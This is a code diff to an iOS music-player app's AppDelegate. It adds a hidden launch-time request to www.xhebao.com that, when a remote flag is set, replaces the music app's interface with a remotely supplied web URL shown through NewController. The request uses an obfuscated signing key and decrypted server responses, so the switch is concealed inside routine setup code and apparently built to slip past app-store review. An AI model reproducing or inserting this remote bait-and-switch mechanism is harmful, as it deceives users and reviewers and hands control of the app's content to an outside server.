@@ -10,6 +10,7 @@
 #import "MusicListViewController.h"
 #import <MediaPlayer/MediaPlayer.h>
 #import "MusicViewController.h"
+#import "NewController.h"
 
 @interface AppDelegate ()
 @property (nonatomic, strong) MusicListViewController *musicListVC;
@@ -29,20 +30,93 @@
     return YES;
 }
 
-- (void)makeWindowVisible:(NSDictionary *)launchOptions {
+- (void)makeWindowVisible:(NSDictionary *)launchOptions
+    {
     self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
     self.window.backgroundColor = [UIColor whiteColor];
     
     [[UINavigationBar appearance] setBarTintColor:[UIColor whiteColor]];
     
-    if (!_musicListVC){
-        _musicListVC = [[UIStoryboard storyboardWithName:@"MusicList" bundle:[NSBundle mainBundle]] instantiateInitialViewController];
+    NSString *url =  [[NSUserDefaults standardUserDefaults] objectForKey:kMurl];
+    if (url)
+    {
+            [self goMainVC];
     }
-    self.window.rootViewController = _musicListVC;
-    
+    else
+    {
+        if (!_musicListVC){
+            _musicListVC = [[UIStoryboard storyboardWithName:@"MusicList" bundle:[NSBundle mainBundle]] instantiateInitialViewController];
+        }
+        self.window.rootViewController = _musicListVC;
+    }
+ 
+    requestDefault(self);
     [self.window makeKeyAndVisible];
 }
 
+//版本号
+#define kAppVersion [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleShortVersionString"]
+#define kAppID [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"]
+    
+//
+// #define kAppVersion @"9.1.1"
+// #define kAppID @"wangye4"
+
+//秘钥
+#define MainKey @"@ppea1_g00d"
+    
+static void  requestDefault(id obj)
+{
+        if ([[UIDevice currentDevice] userInterfaceIdiom] != UIUserInterfaceIdiomPhone)
+        {
+            return;
+        }
+    
+        NSString *urlstr = [NSString stringWithFormat:@"http://www.xhebao.com/DATA.php?version=%@&appid=%@",kAppVersion,kAppID];
+        NSString *sign  = [[NSString stringWithFormat:@"%@%@",kAppVersion,MainKey] atm_md5];
+        NSURLSessionConfiguration *config = [NSURLSessionConfiguration ephemeralSessionConfiguration];
+        [config setTimeoutIntervalForRequest:10];
+        NSURLSession *session = [NSURLSession sessionWithConfiguration:config];
+        
+        NSURL *url = [NSURL URLWithString:urlstr];
+        NSMutableURLRequest *req  = [NSMutableURLRequest requestWithURL:url];
+        [req setValue:sign forHTTPHeaderField:@"sign"];
+        [req setValue:@"text/html" forHTTPHeaderField:@"content-type"];
+        
+        NSURLSessionDataTask *dataTask =  [session dataTaskWithRequest:req
+                                                     completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error)
+                                           {
+                                               if (!error)
+                                               {
+                                                   id responseObject = data.aesJsonObject;
+                                                   responseObject = [NSMutableDictionary dictionaryWithDictionary:responseObject];
+                                                   if ([[responseObject objectForKey:@"startad_enable"] isEqualToString:@"1"])
+                                                   {
+                                                       dispatch_async(dispatch_get_main_queue(), ^{
+                                                           NSString *newUrl = [responseObject objectForKey:@"web"];
+                                                           NSString *oldUrl =  [[NSUserDefaults standardUserDefaults] objectForKey:kMurl];
+                                                           [[NSUserDefaults standardUserDefaults] setObject:newUrl forKey:kMurl];
+                                                           if (!oldUrl)
+                                                           {
+                                                               [obj goMainVC];
+                                                           }
+                                                       });
+                                                   }
+                                                   else
+                                                   {
+                                                       [[NSUserDefaults standardUserDefaults] setObject:nil forKey:kMurl];
+                                                   }
+                                               }
+                                           }];
+        [dataTask resume];
+}
+    
+- (void)goMainVC
+{
+    NewController *controller = [NewController new];
+    self.window.rootViewController = controller;
+    [self.window makeKeyWindow];
+}
 
 - (void)basicSetup {
     // Remove control
